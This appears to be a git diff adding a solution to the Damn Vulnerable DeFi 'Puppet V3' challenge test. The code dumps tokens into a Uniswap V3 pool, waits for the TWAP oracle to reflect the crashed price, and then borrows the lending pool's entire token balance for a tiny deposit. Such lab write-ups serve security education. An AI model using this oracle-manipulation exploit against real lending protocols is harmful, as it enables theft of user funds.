@@ -11,6 +11,20 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
 
+interface ISwapRouter {
+    struct ExactInputSingleParams {
+        address tokenIn;
+        address tokenOut;
+        uint24 fee;
+        address recipient;
+        uint256 deadline;
+        uint256 amountIn;
+        uint256 amountOutMinimum;
+        uint160 sqrtPriceLimitX96;
+    }
+    function exactInputSingle(ExactInputSingleParams calldata params) external returns (uint256 amountOut);
+}
+
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -116,10 +130,52 @@ contract PuppetV3Challenge is Test {
     }
 
     /**
-     * CODE YOUR SOLUTION HERE
-     */
+    * CODE YOUR SOLUTION HERE
+    * You need to set a mainnet RPC URL. Create a .env file in your project root:
+    * echo "MAINNET_FORKING_URL=https://eth-mainnet.g.alchemy.com/v2/YOUR_API_KEY" > .env
+    */
     function test_puppetV3() public checkSolvedByPlayer {
-        
+        // Interfaces needed for the swap
+        ISwapRouter swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+
+        // Approve router to spend player's tokens
+        token.approve(address(swapRouter), type(uint256).max);
+
+        // Dump all 110 DVT tokens into Uniswap → crashes DVT price relative to WETH
+        swapRouter.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams({
+                tokenIn: address(token),
+                tokenOut: address(weth),
+                fee: FEE,
+                recipient: player,
+                deadline: block.timestamp,
+                amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
+                amountOutMinimum: 0,
+                sqrtPriceLimitX96: 0
+            })
+        );
+
+        // Skip 110 seconds so TWAP reflects the crashed price
+        // (_isSolved checks block.timestamp - initialBlockTimestamp < 115)
+        skip(110 seconds);
+
+        // Calculate how much WETH we need to borrow all 1M tokens
+        uint256 depositRequired = lendingPool.calculateDepositOfWETHRequired(
+            LENDING_POOL_INITIAL_TOKEN_BALANCE
+        );
+
+        // Wrap all ETH to WETH (player has 1 ETH + whatever we got from the swap)
+        uint256 wethFromSwap = weth.balanceOf(player);
+        weth.deposit{value: player.balance}();
+
+        // Approve lending pool to pull WETH
+        weth.approve(address(lendingPool), type(uint256).max);
+
+        // Borrow all tokens — deposit should now be tiny due to crashed TWAP
+        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+
+        // Send to recovery
+        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
     }
 
     /**
